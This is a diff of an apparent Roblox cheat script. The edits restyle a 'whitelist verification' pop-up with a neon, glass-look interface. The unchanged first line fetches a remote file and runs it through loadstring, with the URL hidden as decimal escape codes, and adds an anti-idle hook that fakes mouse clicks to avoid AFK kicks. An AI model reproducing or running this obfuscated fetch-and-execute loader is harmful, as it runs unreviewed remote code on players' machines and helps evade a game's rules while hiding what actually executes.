@@ -1,124 +1,211 @@
 local a=((function()local a,b=0,1 return function(c)local d=b;if c then a,b=0,1 end;b=a+b;a=d;return a end end)())local c=loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\105\121\111\117\108\105\110\47\105\121\111\117\108\105\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\97\116\111"))()local d=true;local e=game:GetService("\80\108\97\121\101\114\115").LocalPlayer;e.Idled:Connect(function()game:GetService("\86\105\114\116\117\97\108\85\115\101\114"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)wait(1)game:GetService("\86\105\114\116\117\97\108\85\115\101\114"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)end)
 
 local function f(g)
-    local h=Instance.new("\83\99\114\101\101\110\71\117\105")
-    h.Name="\87\104\105\116\101\108\105\115\116\86\101\114\105\102\105\99\97\116\105\111\110"
-    h.Parent=game.CoreGui
+    local h = Instance.new("ScreenGui")
+    h.Name = "WhitelistVerification"
+    h.Parent = game.CoreGui
+    h.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
-    local i=Instance.new("\70\114\97\109\101")
-    i.Size=UDim2.new(0,450,0,280)
-    i.Position=UDim2.new(0.5,-225,0.5,-140)
-    i.BackgroundColor3=Color3.fromRGB(25,25,35)
-    i.BorderSizePixel=0
-    i.Parent=h
+    -- 主容器 - 玻璃态效果
+    local mainContainer = Instance.new("Frame")
+    mainContainer.Size = UDim2.new(0, 480, 0, 360)
+    mainContainer.Position = UDim2.new(0.5, -240, 0.5, -180)
+    mainContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+    mainContainer.BackgroundTransparency = 0.1
+    mainContainer.BorderSizePixel = 0
+    mainContainer.Parent = h
     
-    -- 添加现代化UI元素
+    -- 玻璃态模糊效果
+    local blurEffect = Instance.new("BlurEffect")
+    blurEffect.Size = 8
+    blurEffect.Parent = mainContainer
+    
+    -- 现代化圆角
     local UICorner = Instance.new("UICorner")
-    UICorner.CornerRadius = UDim.new(0,16)
-    UICorner.Parent = i
+    UICorner.CornerRadius = UDim.new(0, 20)
+    UICorner.Parent = mainContainer
     
+    -- 霓虹边框
     local UIStroke = Instance.new("UIStroke")
-    UIStroke.Color = g and Color3.fromRGB(0,200,100) or Color3.fromRGB(200,50,50)
+    UIStroke.Color = g and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(255, 50, 100)
     UIStroke.Thickness = 2
-    UIStroke.Parent = i
+    UIStroke.Transparency = 0.3
+    UIStroke.Parent = mainContainer
     
-    -- 添加顶部装饰条
-    local topBar = Instance.new("Frame")
-    topBar.Size = UDim2.new(1,0,0,4)
-    topBar.Position = UDim2.new(0,0,0,0)
-    topBar.BackgroundColor3 = g and Color3.fromRGB(0,200,100) or Color3.fromRGB(200,50,50)
-    topBar.BorderSizePixel = 0
-    topBar.Parent = i
+    -- 动态光效边框
+    local glowStroke = Instance.new("UIStroke")
+    glowStroke.Color = g and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(255, 100, 150)
+    glowStroke.Thickness = 1
+    glowStroke.Transparency = 0.7
+    glowStroke.Parent = mainContainer
+    
+    -- 顶部科技栏
+    local topTechBar = Instance.new("Frame")
+    topTechBar.Size = UDim2.new(1, 0, 0, 6)
+    topTechBar.Position = UDim2.new(0, 0, 0, 0)
+    topTechBar.BackgroundColor3 = g and Color3.fromRGB(0, 150, 255) or Color3.fromRGB(255, 80, 120)
+    topTechBar.BorderSizePixel = 0
+    topTechBar.Parent = mainContainer
     
     local topCorner = Instance.new("UICorner")
-    topCorner.CornerRadius = UDim.new(0,16)
-    topCorner.Parent = topBar
+    topCorner.CornerRadius = UDim.new(0, 20)
+    topCorner.Parent = topTechBar
     
-    local j=Instance.new("\85\73\83\116\114\111\107\101")
-    j.Color=g and Color3.fromRGB(0,200,100)or Color3.fromRGB(200,50,50)
-    j.Thickness=2 
-    j.Parent=i
+    -- 动态扫描线效果
+    local scanLine = Instance.new("Frame")
+    scanLine.Size = UDim2.new(1, 0, 0, 2)
+    scanLine.Position = UDim2.new(0, 0, 0, 0)
+    scanLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    scanLine.BackgroundTransparency = 0.8
+    scanLine.BorderSizePixel = 0
+    scanLine.Parent = topTechBar
     
-    -- 图标和标题
-    local iconLabel = Instance.new("TextLabel")
-    iconLabel.Size = UDim2.new(0,40,0,40)
-    iconLabel.Position = UDim2.new(0.5,-20,0.05,0)
-    iconLabel.BackgroundTransparency = 1
-    iconLabel.Text = g and "✓" or "✗"
-    iconLabel.TextColor3 = g and Color3.fromRGB(0,200,100) or Color3.fromRGB(200,50,50)
-    iconLabel.TextSize = 24
-    iconLabel.Font = Enum.Font.GothamBold
-    iconLabel.Parent = i
+    -- 状态图标 - 全息风格
+    local statusIcon = Instance.new("ImageLabel")
+    statusIcon.Size = UDim2.new(0, 80, 0, 80)
+    statusIcon.Position = UDim2.new(0.5, -40, 0.15, 0)
+    statusIcon.BackgroundTransparency = 1
+    statusIcon.Image = "rbxassetid://" .. (g and "11684537432" or "11684537654") -- 科技风图标
+    statusIcon.ImageColor3 = g and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(255, 50, 100)
+    statusIcon.Parent = mainContainer
     
-    local k=Instance.new("\84\101\120\116\76\97\98\101\108")
-    k.Size=UDim2.new(0.8,0,0,40)
-    k.Position=UDim2.new(0.1,0,0.2,0)
-    k.BackgroundTransparency=1 
-    k.Text=g and"\239\188\137\239\188\137 \233\129\148\232\175\173\233\128\154\232\191\135"or"\239\188\140\239\188\137 \233\129\148\232\175\173\229\164\177\232\180\165"
-    k.TextColor3=g and Color3.fromRGB(0,200,100)or Color3.fromRGB(200,50,50)
-    k.TextScaled=true 
-    k.Font=Enum.Font.GothamBold 
-    k.Parent=i
+    -- 状态标题 - 未来字体
+    local statusTitle = Instance.new("TextLabel")
+    statusTitle.Size = UDim2.new(0.8, 0, 0, 50)
+    statusTitle.Position = UDim2.new(0.1, 0, 0.4, 0)
+    statusTitle.BackgroundTransparency = 1
+    statusTitle.Text = g and "VERIFICATION SUCCESS" or "ACCESS DENIED"
+    statusTitle.TextColor3 = g and Color3.fromRGB(0, 255, 255) or Color3.fromRGB(255, 50, 100)
+    statusTitle.TextSize = 24
+    statusTitle.Font = Enum.Font.GothamBlack
+    statusTitle.TextStrokeTransparency = 0.8
+    statusTitle.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+    statusTitle.Parent = mainContainer
     
-    local l=Instance.new("\84\101\120\116\76\97\98\101\108")
-    l.Size=UDim2.new(0.9,0,0,80)
-    l.Position=UDim2.new(0.05,0,0.4,0)
-    l.BackgroundTransparency=1 
-    l.Text=g and"\230\141\174\232\191\189\228\189\191\231\148\168\232\132\154\230\156\172\239\188\129\10\231\148\168\230\136\183: "..game.Players.LocalPlayer.Name or"\230\156\170\230\142\162\230\129\162\228\189\191\231\148\168\10\232\129\148\231\179\187\228\189\160\232\128\133: 68848516"
-    l.TextColor3=Color3.fromRGB(220,220,220)
-    l.TextScaled=true 
-    l.Font=Enum.Font.Gotham 
-    l.TextWrapped=true 
-    l.Parent=i
+    -- 状态描述
+    local statusDesc = Instance.new("TextLabel")
+    statusDesc.Size = UDim2.new(0.9, 0, 0, 60)
+    statusDesc.Position = UDim2.new(0.05, 0, 0.55, 0)
+    statusDesc.BackgroundTransparency = 1
+    statusDesc.Text = g and "SYSTEM ACCESS GRANTED\nUSER: " .. game.Players.LocalPlayer.Name or "UNAUTHORIZED ACCESS DETECTED\nCONTACT: SUPPORT@SYSTEM.COM"
+    statusDesc.TextColor3 = Color3.fromRGB(200, 200, 220)
+    statusDesc.TextSize = 16
+    statusDesc.Font = Enum.Font.Gotham
+    statusDesc.TextWrapped = true
+    statusDesc.TextXAlignment = Enum.TextXAlignment.Center
+    statusDesc.Parent = mainContainer
     
-    -- 添加进度条背景
-    local progressBg = Instance.new("Frame")
-    progressBg.Size = UDim2.new(0.8,0,0,8)
-    progressBg.Position = UDim2.new(0.1,0,0.75,0)
-    progressBg.BackgroundColor3 = Color3.fromRGB(60,60,70)
-    progressBg.BorderSizePixel = 0
-    progressBg.Parent = i
+    -- 进度条容器
+    local progressContainer = Instance.new("Frame")
+    progressContainer.Size = UDim2.new(0.8, 0, 0, 12)
+    progressContainer.Position = UDim2.new(0.1, 0, 0.75, 0)
+    progressContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    progressContainer.BorderSizePixel = 0
+    progressContainer.Parent = mainContainer
     
     local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(0,4)
-    progressCorner.Parent = progressBg
+    progressCorner.CornerRadius = UDim.new(0, 6)
+    progressCorner.Parent = progressContainer
     
+    -- 动态进度条
     local progressBar = Instance.new("Frame")
-    progressBar.Size = UDim2.new(0,0,1,0)
-    progressBar.Position = UDim2.new(0,0,0,0)
-    progressBar.BackgroundColor3 = g and Color3.fromRGB(0,200,100) or Color3.fromRGB(200,50,50)
+    progressBar.Size = UDim2.new(0, 0, 1, 0)
+    progressBar.Position = UDim2.new(0, 0, 0, 0)
+    progressBar.BackgroundColor3 = g and Color3.fromRGB(0, 200, 255) or Color3.fromRGB(255, 80, 120)
     progressBar.BorderSizePixel = 0
-    progressBar.Parent = progressBg
+    progressBar.Parent = progressContainer
     
     local progressBarCorner = Instance.new("UICorner")
-    progressBarCorner.CornerRadius = UDim.new(0,4)
+    progressBarCorner.CornerRadius = UDim.new(0, 6)
     progressBarCorner.Parent = progressBar
     
-    local m=Instance.new("\84\101\120\116\76\97\98\101\108")
-    m.Size=UDim2.new(1,0,0,30)
-    m.Position=UDim2.new(0,0,0.85,0)
-    m.BackgroundTransparency=1 
-    m.Text="\51\231\167\146\229\144\142\229\133\179\233\151\173"
-    m.TextColor3=Color3.fromRGB(180,180,180)
-    m.TextScaled=true 
-    m.Font=Enum.Font.Gotham 
-    m.Parent=i
+    -- 进度条发光效果
+    local progressGlow = Instance.new("UIStroke")
+    progressGlow.Color = g and Color3.fromRGB(0, 150, 255) or Color3.fromRGB(255, 100, 150)
+    progressGlow.Thickness = 1
+    progressGlow.Transparency = 0.5
+    progressGlow.Parent = progressBar
     
+    -- 倒计时显示
+    local countdownText = Instance.new("TextLabel")
+    countdownText.Size = UDim2.new(1, 0, 0, 30)
+    countdownText.Position = UDim2.new(0, 0, 0.85, 0)
+    countdownText.BackgroundTransparency = 1
+    countdownText.Text = "INITIALIZING IN 3s"
+    countdownText.TextColor3 = Color3.fromRGB(150, 150, 180)
+    countdownText.TextSize = 14
+    countdownText.Font = Enum.Font.Gotham
+    countdownText.Parent = mainContainer
+    
+    -- 底部标注 - 科技风格
+    local creditText = Instance.new("TextLabel")
+    creditText.Size = UDim2.new(1, 0, 0, 20)
+    creditText.Position = UDim2.new(0, 0, 0.95, 0)
+    creditText.BackgroundTransparency = 1
+    creditText.Text = "BY KOLILXI WITH YSIA"
+    creditText.TextColor3 = Color3.fromRGB(100, 100, 150)
+    creditText.TextSize = 12
+    creditText.Font = Enum.Font.Gotham
+    creditText.TextTransparency = 0.3
+    creditText.Parent = mainContainer
+    
+    -- 粒子效果（可选）
     spawn(function()
-        for n=3,1,-1 do 
-            m.Text=n.."\231\167\146\229\133\179\233\151\173"
-            -- 更新进度条
+        -- 扫描线动画
+        while h.Parent do
+            scanLine.Position = UDim2.new(0, 0, 0, 0)
+            scanLine:TweenPosition(UDim2.new(0, 0, 1, 0), Enum.EasingDirection.InOut, Enum.EasingStyle.Linear, 2, true)
+            wait(2.1)
+        end
+    end)
+    
+    -- 霓虹闪烁效果
+    spawn(function()
+        while h.Parent do
+            glowStroke.Transparency = 0.3
+            wait(0.5)
+            glowStroke.Transparency = 0.7
+            wait(0.5)
+        end
+    end)
+    
+    -- 倒计时和进度条动画
+    spawn(function()
+        for n = 3, 1, -1 do
+            countdownText.Text = "INITIALIZING IN " .. n .. "s"
+            
+            -- 平滑进度条动画
+            local progressValue = (3 - n) / 3
             progressBar:TweenSize(
-                UDim2.new((3-n)/3,0,1,0),
+                UDim2.new(progressValue, 0, 1, 0),
                 Enum.EasingDirection.Out,
                 Enum.EasingStyle.Quad,
-                0.5,
+                0.8,
                 true
             )
-            wait(1)
-        end 
+            
+            -- 进度条脉冲效果
+            for i = 1, 3 do
+                progressGlow.Thickness = 2
+                wait(0.1)
+                progressGlow.Thickness = 1
+                wait(0.1)
+            end
+            
+            wait(0.4) -- 总等待1秒
+        end
+        
+        -- 最终闪烁效果
+        for i = 1, 3 do
+            mainContainer.BackgroundTransparency = 0.3
+            wait(0.1)
+            mainContainer.BackgroundTransparency = 0.1
+            wait(0.1)
+        end
+        
         h:Destroy()
     end)
+    
     return h
 end
 
